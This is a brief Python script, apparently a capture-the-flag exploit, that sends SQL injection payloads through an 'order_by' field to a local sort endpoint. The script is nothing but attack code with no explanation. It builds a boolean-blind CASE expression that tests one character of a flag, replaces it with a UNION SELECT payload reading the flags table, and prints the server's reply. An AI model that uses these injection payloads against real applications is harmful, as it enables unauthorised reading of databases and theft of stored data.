import requests
url = 'http://localhost:1337/sort'




payload = """
CASE
WHEN (SELECT SUBSTR(flag,2,1) FROM flags_table)='l'
  THEN UCL_WON 
ELSE 
  ID 
END
"""

payload = """
    1 UNION SELECT flag FROM flags--
"""

data = {
    'order_by': payload
}

r = requests.post(url, data=data)
print(r.text)


